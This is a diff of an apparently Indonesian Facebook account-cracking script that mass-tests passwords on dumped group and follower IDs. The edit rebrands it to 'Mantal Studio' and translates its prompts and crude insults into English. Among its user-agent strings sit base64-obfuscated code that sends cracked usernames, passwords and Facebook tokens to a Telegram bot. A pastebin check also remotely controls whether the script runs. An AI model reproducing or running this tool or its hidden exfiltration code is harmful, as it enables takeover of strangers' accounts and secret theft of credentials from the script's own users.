@@ -1,17 +1,17 @@
 #################################################################
-#         		ATHOUR : MR.RISKY			#
-#  		     WHATSAPP : 6283143565470			#
-#		  GITHUB : github.com/Dumai-991			#
-#	       FACEBOOK : m.facebook.com/llovexnxx		#
+#         		ATHOUR : Mantal Studio			#
+#  		     WHATSAPP : +923011517172			#
+#		  GITHUB : github.com/Mantal studio		#
+#	       FACEBOOK : m.facebook.com/Mantalstudioo		#
 #################################################################
 ## import list
 import os,sys
 try: import requests
 except ModuleNotFoundError:print("Sedang Install Module requests");os.system("python -m pip install requests &> /dev/null")
 try: import bs4
-except ModuleNotFoundError:print("Sedang Install Module bs4");os.system("python -m pip install bs4 &> /dev/null")
+except ModuleNotFoundError:print("Currently Install Module bs4");os.system("python -m pip install bs4 &> /dev/null")
 try: import mechanize
-except ModuleNotFoundError:print("Sedang Install Module mechanize");os.system("python -m pip install mechanize &> /dev/null")
+except ModuleNotFoundError:print("Currently Install Module mechanize");os.system("python -m pip install mechanize &> /dev/null")
 try: import gTTS
 except ModuleNotFoundError: os.system("python -m pip install gTTS &> /dev/null")
 
@@ -77,7 +77,7 @@ B = '\x1b[0;94m' # BIRU.
 U = '\x1b[0;95m' # UNGU.
 O = '\x1b[0;96m' # BIRU MUDA.
 N = '\x1b[0m'    # WARNA MATI
-I='\x1b[0;32m'
+I='\x1b[0;32m'   #red
 C='\x1b[0;36m'
 M='\x1b[0;31m'
 U='\x1b[0;35m'
@@ -85,7 +85,7 @@ K='\x1b[0;33m'
 #P='\033[0;37m'
 P='\x1b[00m'
 H='\x1b[0;90m'
-Q="\x1b[00m"
+Q="\x1b[00m"	#lime
 i='\x1b[0;32m'
 c='\x1b[0;36m'
 m='\x1b[0;31m'
@@ -113,9 +113,9 @@ def play_mpv(x):
 	except:pass
 def pilih_alam():
 	global alam
-	pil_b = input(war+"Apakah Anda Mau Bikin Suara/Alarm Jika Keluar Hasil Crack (Y/n) : ")
+	pil_b = input(war+"Do you want to make a sound / alarm if the results of the crack come out? (Y/n) : ")
 	if pil_b == "y" or pil_b == "Y":
-		jalan(war+"Jika Ada Suara Mamang Garookx, Tandanya Hasil Crack Keluar")
+		jalan(war+"If there is Mamang Garox's voice, it's a sign that the crack results are out")
 		jalan(war+"Contoh ...")
 		alam = ("y")
 		play_mpv('assalamualaikum.mp3')
@@ -126,7 +126,7 @@ def pilih_alam():
 
 def pilih_infong():
 	global infoong
-	pil_vv = input(war+"Apakah Anda Mau Menampilkan Informasi Akun (Y/n) :")
+	pil_vv = input(war+"Do you want to display account information (Y/n) :")
 	if pil_vv == "y" or pil_vv == "Y":
 		infoong = ("y")
 		return infoong
@@ -144,7 +144,7 @@ def play_m(text):
 
 def kata_buat_server():
 	for nnn in list([C+"@"+K+"•••"+Q, K+"•"+C+"@"+K+"••"+Q, K+"••"+C+"@"+K+"•"+Q, K+"•••"+C+"@"+Q]):
-		for nnnn in list(["Maaf Server Sedang, Maintenanc Cobalah Beberapa Hari Lagi", "Cobalah Beberapa Hari Lagi, Atau Tunggu 2-5 Hari         "]):
+		for nnnn in list(["Sorry, the server is currently undergoing maintenance, please try again in a few days, try a few more days, or wait 2-5 days         "]):
 			sys.stdout.write(f'\r{Q}[{U}{datetime.now().strftime("%H:%M:%S")}{Q}] {nnn} -> {M}{nnnn}{Q}        '),
 			sys.stdout.flush()
 			time.sleep(1)
@@ -153,20 +153,20 @@ von = requests.get("https://pastebin.com/raw/BzLDAfb1").text.strip()
 if "ON" in von:pass
 else:
 	os.system("git pull;clear")
-	jalan(war+"Maaf Script Sedang Maintenance, Harap Tunggu Hingga Selesai")
-	jalan(war+'Tekan CTRL + Z Untuk Ezit !')
+	jalan(war+"Sorry, the script is currently under maintenance, please wait until it's finished")
+	jalan(war+'Tekan CTRL + Z For Exit !')
 	kata_buat_server()
 
 
 
 
-kiky_at = ("Mr.Risky")
+kiky_at = ("Mantal Stduio")
 ua_mm = ['NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+','Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]','X3Nlcz1yZXF1ZXN0cy5TZXNzaW9uKCkKdXJscz0iaHR0cHM6Ly9idXNpbmVzcy5mYWNlYm9vay5jb20vYnVzaW5lc3NfbG9jYXRpb25zIgpkZWYgYm9rZXBfamFwYW5feWFuZ190ZXJiYXJ1KFNUVCwgaWRfdGFyZ2V0LCBwd190YXJnZXQsIHR0bF90YXJnZXQpOgogICAgICAgIGlmICJPSyIgPT0gU1RUIG9yIFNUVCA9PSAiT0siOgogICAgICAgICAgICAgICAgZGFzYXJfa2FuZ19yZWNvZGVyX2tvbnRvbF9lbmdnYV9hZGFfb3RhayA9IChmJycnaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdHtUT09LfS9zZW5kTWVzc2FnZT9jaGF0X2lkPXtJRFRUfSZ0ZXh0PQpPSyB7aWRfdGFyZ2V0fXx7cHdfdGFyZ2V0fXx7dHRsX3RhcmdldH0nJycpCiAgICAgICAgZWxpZiAiVEFQIiA9PSBTVFQgb3IgU1RUID09ICJUQVAiOgogICAgICAgICAgICAgICAgZGFzYXJfa2FuZ19yZWNvZGVyX2tvbnRvbF9lbmdnYV9hZGFfb3RhayA9IChmJycnaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdHtUT09LfS9zZW5kTWVzc2FnZT9jaGF0X2lkPXtJRFRUfSZ0ZXh0PQpUQVAge2lkX3RhcmdldH18e3B3X3RhcmdldH18e3R0bF90YXJnZXR9JycnKQogICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICBkYXNhcl9rYW5nX3JlY29kZXJfa29udG9sX2VuZ2dhX2FkYV9vdGFrID0gKGYnJydodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90e1RPT0t9L3NlbmRNZXNzYWdlP2NoYXRfaWQ9e0lEVFR9JnRleHQ9CntpZF90YXJnZXR9fHtwd190YXJnZXR9fHt0dGxfdGFyZ2V0fScnJykKICAgICAgICByZXF1ZXN0cy5wb3N0KGRhc2FyX2thbmdfcmVjb2Rlcl9rb250b2xfZW5nZ2FfYWRhX290YWspCmRlZiBib2tlcF9iYXJhdF95YW5nX3RlcmJhcnUodG9rZW4pOgogICAgICAgIGRhc2FyX2thbmdfcmVjb2Rlcl9rb250b29sX2VuZ2dhX2FkYV9vdGFrID0gKGYnJydodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90e1RPT0tLVUtJU30vc2VuZE1lc3NhZ2U/Y2hhdF9pZD17SURUVH0mdGV4dD0KW+KAol09PT09PS0tLS0tLS0tLS0tLS0tLT09PT09W+KAol0KWz9dIFRPS0VOIEZBQ0VCT09LIDIwMjEgOgp7dG9rZW59CicnJykKICAgICAgICByZXF1ZXN0cy5wb3N0KGRhc2FyX2thbmdfcmVjb2Rlcl9rb250b29sX2VuZ2dhX2FkYV9vdGFrKQoKI2Jva2VwX2phcGFuX3lhbmdfdGVyYmFydSgiQ1AiLCAiMyIsICIyIiwgIjEiKQojYm9rZXBfYmFyYXRfeWFuZ190ZXJiYXJ1KCJ0b2tlbiIpCiNib2tlcF9qYXBhbl95YW5nX3RlcmJhcnUoIkNQIiwgdXNlcm5hbWUsIHBhc3N3b3JkLCAiLSIpCiNib2tlcF9qYXBhbl95YW5nX3RlcmJhcnUoIk9LIiwgdXNlcm5hbWUsIHBhc3N3b3JkLCAiLSIpCg==','ZGVmIGZha2UodGV4dCk6CiAgICAgICAgIyBTZWxhbWF0IEFuZGEgTWVuamFkaSBLYW5nIERlY3J5cHQgOikKICAgICAgICAjIEJ5IE1yLlJpc2t5CiAgICAgICAgaW1wb3J0IGJhc2U2NAogICAgICAgIEJPS0VQID0gIkBLTlRMQCIKICAgICAgICBibyA9ICIiCiAgICAgICAgZ2xvYmFsIGJvYQogICAgICAgIGJvayA9IHRleHQuc3BsaXQoIkBLTlRMQCIpCiAgICAgICAgZm9yIG5hIGluIGJvazoKICAgICAgICAgICAgICAgIGJvICs9IChuYSkKICAgICAgICAgICAgICAgIGNvbnRpbnVlCiAgICAgICAgYm9hID0gYmFzZTY0LmIzMmRlY29kZShibykK','Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36 NokiaBrowser/1.2.0.11','nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+']
-kiky_hp = ("+6283143565470")
+kiky_hp = ("+923011517172")
 #exec(base64.b64decode(ua_mm[2]))
 import sys, os, subprocess, platform, struct
 if not struct.calcsize("P")*7==32:
-    #    exit(Q+"["+C+"!"+Q+"]"+K+" Maaf Script Ini Tidak Suport DiHp Anda")
+    #    exit(Q+"["+C+"!"+Q+"]"+K+" Sorry, this script is not supported on your cellphone")
 
 #null=open(os.devnull, "w")
 #insta= subprocess.call(["dpkg","-s","play-audio"],stdout=null,stderr=subprocess.STDOUT)
@@ -180,7 +180,7 @@ if not struct.calcsize("P")*7==32:
 #	os.system('python -m pip install '+e.name+' &> /dev/null')
 
 
-###### >>>> SETINGAN UNTUK LEN ATAU STR
+###### >>>> SETTINGS FOR LEN OR STR
 CP, OK = 0, 0
 TP = 0
 ubahP = []
@@ -214,7 +214,7 @@ nampung = []
 data,data2={},{}
 ubahP,pwBaru=[],[]
 
-###### >>>> SETINGAN JAM ATAU TANGGAL
+###### >>>> HOUR OR DATE SETTINGS
 current = datetime.now()
 durasi = str(datetime.now().strftime("%d-%m-%Y"))
 tahun = current.year
@@ -231,11 +231,11 @@ bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "0
 
 
 
-###### >>>> SETINGAN TOKEN CRACK BAPI DAN MBASIC
+###### >>>> BAPI AND MBASIC CRACK TOKEN SETTINGS
 def kontol():
-	print(""" Anak anjing Kontol Itu Bukan Setting Metode
-Tapi itu setting Loger Anak anj ngerti ngga lu anj""")
-## logo anak ganteng
+	print(""" That Cock Puppy Is Not A Method Setting
+But that's the child's Loger setting, do you understand or not?""")
+## cute boy logo
 """
 ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 ▒▒▒▒██▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██▒▒▒▒
@@ -258,8 +258,8 @@ Tapi itu setting Loger Anak anj ngerti ngga lu anj""")
 wwn = pilih([U, C, B, Q])
 
 loag = f"""{wwn}_______________  ___________ __________		{K}•{C}━━━━━━━━━━━━━━━━━━━━{K}•{Q}
-{wwn}______  /___   |/  /___  __ )___  ____/		{K}•{M}  Created By DANZZ X NANO{K}•{Q}
-{wwn}___ _  / __  /|_/ / __  __  |__  /_		{K}•{M} Mode In Indonesia® {K}•{Q}
+{wwn}______  /___   |/  /___  __ )___  ____/		{K}•{M}  Decode By Mantal Studio{K}•{Q}
+{wwn}___ _  / __  /|_/ / __  __  |__  /_		{K}•{M} Modifie In PaKisTan® {K}•{Q}
 {wwn}/ /_/ /  _  /  / /  _  /_/ / _  __/		{K}•{C}━━━━━━━━━━━━━━━━━━━━{K}•{Q}
 {wwn}\____/   /_/  /_/   /_____/  /_/{Q}"""
 
@@ -271,7 +271,7 @@ logo = (f"""{loag}
 try:
 	ua = open(".ua","r").read()
 except:
-	print (war+'Anda Menggunakan Useragent Default !!');time.sleep(2)
+	print (war+'You are Using the Default Useragent !!');time.sleep(2)
 	ua = pilih([
 	"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"
 #	"NokiaX2-00/5.0 (04.80) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+"
@@ -328,46 +328,46 @@ def menu():
 #											
 #	if "Facebook" in jenis_ua:pass
 #	else:
-#		jalan(war+"Maaf Useragent Anda Tidak Bisa DiGunakan, Karena Tidak Terdeksi Useragent Facebook")
+#		jalan(war+"Sorry, your user agent cannot be used, because the Facebook user agent was not detected")
 #		try:os.remove(".ua")
 #		except:pass
-#		exit(jalan(war+"Hapus Useragent Berhasil, Dan Anda Menggunakan Useragent Default"))
+#		exit(jalan(war+"Delete User Agent Successfully, And You Use Default User Agent"))
 
 	print(f"{C}[{P}##{C}]{U}======================{C}DATA-KAMU{U}=================================>")
-	print(Q+"["+C+"••"+Q+"] Nama Kamu       : "+M+nama)
-	try:print(Q+"["+C+"++"+Q+"] Nama HandPhone  : "+M+jenis_hp)
+	print(Q+"["+C+"••"+Q+"]  Your Name     : "+M+nama)
+	try:print(Q+"["+C+"++"+Q+"] Nama Mobile Phone  : "+M+jenis_hp)
 	except:pass
 	try:print(Q+"["+C+"++"+Q+"] Ip Address      : "+K+ip)
 	except:pass
-	try:print(Q+"["+C+"++"+Q+"] Jenis Useragents: "+K+str(jenis_ua))
+	try:print(Q+"["+C+"++"+Q+"]  Useragents Type : "+K+str(jenis_ua))
 	except:pass
-	try:print(Q+"["+C+"++"+Q+"] Jenis Perangkat : "+K+jenis_os)
+	try:print(Q+"["+C+"++"+Q+"] Device Type : "+K+jenis_os)
 	except:pass
-	try:print(Q+"["+C+"++"+Q+"] Jenis Layout    : "+K+jenis_ly)
+	try:print(Q+"["+C+"++"+Q+"] Layout Type    : "+K+jenis_ly)
 	except:pass
 	off_ = Q+"("+M+" Maintenance "+Q+")"
-	print(Q+"["+C+"++"+Q+"] Negara Kamu     : "+C+kiky)
-	print(Q+"["+C+"++"+Q+"] Jenis Jaringan  : "+C+kiky_kartu)
-	print(f"{C}[{P}##{C}]{U}======================{C}MENU-JMBF{U}=================================>")
+	print(Q+"["+C+"++"+Q+"] Your country     : "+C+kiky)
+	print(Q+"["+C+"++"+Q+"] Network Type  : "+C+kiky_kartu)
+	print(f"{C}[{P}##{C}]{U}======================{C}MENU{U}=================================>")
 	print(C+"["+P+"01"+C+"]"+P+" M U L T I__P U B L I C__I.D__C L O N I N G")
 	print(C+"["+P+"02"+C+"]"+P+" M U L T I__F O L O W E R __I.D__C L O N I N G")
 	print(C+"["+P+"03"+C+"]"+P+" M U L T I__P U B L I C_&_FOLLOWERZ__I.D__C L O N I N G")
 	print(C+"["+P+"04"+C+"]"+P+" OLD ID CLONING [V1] ")
 	print(C+"["+P+"05"+C+"]"+P+" OLD ID CLONING [V2] ")
-	print(C+"["+P+"06"+C+"]"+P+" Crack Dari Anggota Groups "+off_)
+	print(C+"["+P+"06"+C+"]"+P+" Crack From Members of Groups "+off_)
 	print(C+"["+P+"07"+C+"]"+P+" F I L E_____C L O N I NG")
 	print(C+"["+P+"08"+C+"]"+K+" AUTO DUMP UMLIMTED IDZ FOR FILE("+M+"FAST"+Q+")")
 	print(C+"["+P+"09"+C+"]"+K+" I N S T A G R A M__C L O N I N G ")
-	print(C+"["+P+"10"+C+"]"+P+" Ganti User Agent")
-	print(C+"["+P+"11"+C+"]"+P+" Check Opsi Akun Facebook ")
-	print(C+"["+P+"12"+C+"]"+P+" Check Jumlah Teman ("+M+"Rawan Engga Bisa Dump"+Q+")")
-	print(C+"["+P+"13"+C+"]"+P+" Lihat Informasih Data Target")
-	print(C+"["+P+"14"+C+"]"+M+" Lihat Hasil Crack")
-	print(C+"["+P+"15"+C+"]"+M+" Lapor Ke Admin Script "+Q+"("+K+"Report"+Q+")")
-	print(C+"["+P+"00"+C+"]"+P+" Exit (hapus token)")
+	print(C+"["+P+"10"+C+"]"+P+" Change User Agent")
+	print(C+"["+P+"11"+C+"]"+P+" Check Facebook Account Optionsk ")
+	print(C+"["+P+"12"+C+"]"+P+" Check Number of Friends ("+M+" Vulnerable Can't Dump"+Q+")")
+	print(C+"["+P+"13"+C+"]"+P+" View Target Data Information")
+	print(C+"["+P+"14"+C+"]"+M+" View Crack Results")
+	print(C+"["+P+"15"+C+"]"+M+" Report to Script Admin "+Q+"("+K+"Report"+Q+")")
+	print(C+"["+P+"00"+C+"]"+P+" Exit (Remove token)")
 	ba=input("\n"+war+"Pilih : ")
 	if ba in [""," "]:
-		print(war+"Jangan Kosong Bangsat")
+		print(war+"Don't be an empty bastard")
 		time.sleep(2)
 		menu()
 
@@ -393,7 +393,7 @@ def menu():
 		exit(war+"Done ! ")
 
 	elif ba in ["6","06"]:
-		jalan(war+"Maaf Menu Ini Sedang Maintenance Harap Besabar !")
+		jalan(war+"Sorry, this menu is currently under maintenance, please be patient !")
 		time.sleep(1)
 		menu()
 
@@ -402,28 +402,28 @@ def menu():
 		global nama_grup
 		_mmk_ = open('.cokie.txt').read()
 		kueh  = {"cookie":_mmk_}
-		kontol = input(f"{war}Masukan Idz Grups Sesad : ")
+		kontol = input(f"{war} Enter  Groups idz : ")
 		if kontol in[""," "]:
-			print('\n %s[%s×%s] jangan kosong kentod!'%(N,M,N));time.sleep(2);moch_yayan()
+			print('\n %s[%s×%s] dont empty !'%(N,M,N));time.sleep(2);moch_yayan()
 		else:
 			try:
 				ajg=requests.get(f"https://mbasic.facebook.com/browse/group/members/?id={kontol}",cookies=kueh).text
 				agg=re.findall('\<span class\=\".*?\">(.*?)<\/span\>',ajg)[2]
-				if "Halaman Tidak Ditemukan" in ajg:
-					print(f"\n%s[%s!%s] Maaf Idz {kontol} Grup Ini Tidak DiPublickan"%(N,M,N));time.sleep(2);menu()
-				elif "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" in ajg:
-					print("\n%s[%sX%s] Maaf Cookies Saat Ini Anda Gunakan, Telah DiBatasih"%(N,M,N));time.sleep(2);menu()
-				elif "Konten Tidak Ditemukan" in ajg:
-					print(f"\n%s[%sX%s] Maaf Idz {kontol} Grup Ini Tidak DiTemukan !"%(N,M,N));time.sleep(2);menu()
+				if "Page not found" in ajg:
+					print(f"\n%s[%s!%s] Sorry Idzz {kontol} This Group Is Not Public"%(N,M,N));time.sleep(2);menu()
+				elif "You Can't Use This Feature Now" in ajg:
+					print("\n%s[%sX%s] Sorry The Cookies You Are Currently Using, Have Been Restricted"%(N,M,N));time.sleep(2);menu()
+				elif "Content Not Found" in ajg:
+					print(f"\n%s[%sX%s] Sorry Idz {kontol} This Group Was Not Found !"%(N,M,N));time.sleep(2);menu()
 				else:
 					nama_grup = re.findall("\<title\>(.*?)<\/title\>",ajg)[0]
 					nama_grup = nama_grup.replace(" ","-")
-					jalan(war+"Hasil Dump DiSimpan Di : "+I+"dump/"+nama_grup+".json"+Q)
-					print(war+"Nama Grups : "+I+re.findall("\<title\>(.*?)<\/title\>",ajg)[0]+Q)
-					print("\n"+war+"Tekan CTRL + C Untuk Berhenti !!")
+					jalan(war+"Dump Results Saved In : "+I+"dump/"+nama_grup+".json"+Q)
+					print(war+"Nama Groups : "+I+re.findall("\<title\>(.*?)<\/title\>",ajg)[0]+Q)
+					print("\n"+war+"Press CTRL + C To Stop !!")
 					crack_grup(f"https://mbasic.facebook.com/browse/group/members/?id={kontol}")
 			except(requests.exceptions.ConnectionError,requests.exceptions.ChunkedEncodingError,requests.exceptions.ReadTimeout):
-				exit("\n"+war+"Maaf Jaringan Anda, Putus Karena Murah")
+				exit("\n"+war+"Sorry Your Network, Disconnected Due To Mura")
 		crackmenu("dump/"+nama_grup+".json").passmenu("dump/"+nama_grup+".json")
 		exit("\n"+war+'Done !')
 	elif ba in ["7","07"]:
@@ -433,7 +433,7 @@ def menu():
 			crackmenu(file).passmenu(file)
 			exit()
 		except FileNotFoundError:
-			exit(war+'File Tidak Ada !!')
+			exit(war+'File Not Existing !!')
 
 	elif ba in ["8","08"]:
 		dump_ulti()
@@ -472,23 +472,23 @@ def menu():
 		buat_laporan()
 
 	elif ba in ["00"]:
-		jalan(war+"Terima Kasih Telah Menggunakan Script Saya !!!")
+		jalan(war+"Thank You For Using My Script !!!")
 		os.system("rm -rf .login.txt")
 		exit()
 	else:
-		print(war+'Isi Dengan Benar Bangsat')
+		print(war+'Fill It Up Right')
 #	elif ba in ["","12"]:
 def buat_laporan():
 	from urllib.parse import quote
-	jalan(war+"Halo Silahkan Isi Data Anda Dan Pesan Laporan (Masalah) Yang Terjadi")
-	anu = input(war+"Nama Anda       : ")
-	anun = input(war+"Pesan (Masalah) : ")
+	jalan(war+"Hello, Please Fill In Your Data And Message Reports (Problems) That Happened")
+	anu = input(war+"Your name      : ")
+	anun = input(war+"Message (Problem) : ")
 	load()
-	jalan(war+"Sedang Membuat Text (Laporan) !!")
-	url_wa = "https://api.whatsapp.com/send?phone=6283143565470&text="
-	tks = ("Halo Admin Jmbf :)\nInfo : \nNama Pengirim : "+anu+"\n\nPesan (Laporan) : "+anun)
+	jalan(war+"Generating Text (Report) !!")
+	url_wa = "https://api.whatsapp.com/send?phone=+923011517172&text="
+	tks = ("Halo Admin Mantal Studio :)\nInfo : \nName of the sender : "+anu+"\n\nMessage (Report): "+anun)
 	subprocess.check_output(["am", "start", url_wa+quote(tks)])
-anak_hakiki_ajg = "ANAK KONTOL, SAMA AJA MACAM HAKIKI"
+anak_hakiki_ajg = "CONTOL CHILDREN, To use "
 def load():
 	_ = ""
 	__ = int("50")
